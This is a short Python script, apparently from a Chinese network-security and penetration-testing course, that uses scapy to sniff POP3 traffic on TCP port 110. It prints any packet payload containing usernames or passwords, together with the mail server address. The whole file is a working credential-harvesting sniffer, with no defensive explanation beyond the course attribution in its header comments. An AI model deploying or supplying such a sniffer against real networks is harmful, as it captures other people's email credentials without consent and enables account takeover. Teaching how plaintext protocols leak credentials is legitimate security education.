#!/usr/bin/python3.4
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#清除报错
from scapy.all import *

def packet_callback(packet):

	mail_packet = str(packet[TCP].payload)
	#print(mail_packet)
	if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
		print("[*] Server: %s" % packet[IP].dst)
		print("[*] %s" % packet[TCP].payload)


sniff(filter="tcp port 110", prn = packet_callback, store = 0)

